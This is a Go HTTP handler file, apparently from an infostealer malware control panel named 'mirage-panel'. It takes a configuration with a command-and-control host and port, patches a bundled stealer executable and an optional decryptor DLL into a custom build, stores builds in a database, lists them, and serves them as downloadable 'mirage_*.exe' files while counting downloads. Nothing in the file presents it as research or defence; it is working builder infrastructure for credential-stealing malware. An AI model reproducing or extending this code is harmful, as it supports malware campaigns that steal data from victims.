package api

import (
	"crypto/sha256"
	"database/sql"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/go-chi/chi/v5"
	"github.com/user/mirage-panel/internal/services"
)

type BuildHandler struct {
	service      *services.BuildService
	stealerExe   []byte
	decryptorDll []byte
	db           *sql.DB
}

func NewBuildHandler(service *services.BuildService, stealer, decryptor []byte, db *sql.DB) *BuildHandler {
	return &BuildHandler{
		service:      service,
		stealerExe:   stealer,
		decryptorDll: decryptor,
		db:           db,
	}
}

func (h *BuildHandler) Build(w http.ResponseWriter, r *http.Request) {
	var config services.BuildConfig
	if err := json.NewDecoder(r.Body).Decode(&config); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON body")
		return
	}

	if config.C2Host == "" || config.C2Port == 0 {
		writeError(w, http.StatusBadRequest, "c2_host and c2_port are required")
		return
	}

	var decryptor []byte
	if config.IncludeDecryptor && len(h.decryptorDll) > 0 {
		decryptor = h.decryptorDll
	}

	built, err := h.service.Build(h.stealerExe, decryptor, config)
	if err != nil {
		writeError(w, http.StatusInternalServerError, err.Error())
		return
	}

	configJSON, _ := json.Marshal(config)
	configHash := fmt.Sprintf("%x", sha256.Sum256(configJSON))
	fileHash := sha256.Sum256(built)
	sha := hex.EncodeToString(fileHash[:])

	result, err := h.db.Exec(
		`INSERT INTO builds (config_hash, file_size, file_data, sha256, build_tag)
		 VALUES (?, ?, ?, ?, ?)`,
		configHash, len(built), built, sha, config.BuildTag,
	)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to store build")
		return
	}

	id, _ := result.LastInsertId()

	var buildID, createdAt string
	h.db.QueryRow("SELECT id, created_at FROM builds WHERE rowid = ?", id).Scan(&buildID, &createdAt)

	writeJSON(w, http.StatusCreated, map[string]any{
		"id":         buildID,
		"file_size":  len(built),
		"sha256":     sha,
		"build_tag":  config.BuildTag,
		"created_at": createdAt,
	})
}

func (h *BuildHandler) List(w http.ResponseWriter, r *http.Request) {
	rows, err := h.db.Query(`
		SELECT id, config_hash, file_size, sha256, COALESCE(build_tag,''), download_count, created_at
		FROM builds ORDER BY created_at DESC LIMIT 50
	`)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to query builds")
		return
	}
	defer rows.Close()

	type buildEntry struct {
		ID            string `json:"id"`
		ConfigHash    string `json:"config_hash,omitempty"`
		FileSize      int    `json:"file_size"`
		Sha256        string `json:"sha256,omitempty"`
		BuildTag      string `json:"build_tag,omitempty"`
		DownloadCount int    `json:"download_count"`
		CreatedAt     string `json:"created_at"`
	}

	builds := make([]buildEntry, 0)
	for rows.Next() {
		var b buildEntry
		if err := rows.Scan(&b.ID, &b.ConfigHash, &b.FileSize, &b.Sha256, &b.BuildTag, &b.DownloadCount, &b.CreatedAt); err != nil {
			continue
		}
		builds = append(builds, b)
	}

	writeJSON(w, http.StatusOK, builds)
}

func (h *BuildHandler) Download(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	if id == "" {
		writeError(w, http.StatusBadRequest, "missing build id")
		return
	}

	var fileData []byte
	var sha string
	err := h.db.QueryRow("SELECT file_data, sha256 FROM builds WHERE id = ?", id).Scan(&fileData, &sha)
	if err == sql.ErrNoRows {
		writeError(w, http.StatusNotFound, "build not found")
		return
	}
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to fetch build")
		return
	}

	h.db.Exec("UPDATE builds SET download_count = download_count + 1 WHERE id = ?", id)

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="mirage_%s.exe"`, id[:8]))
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(fileData)))
	w.Write(fileData)
}
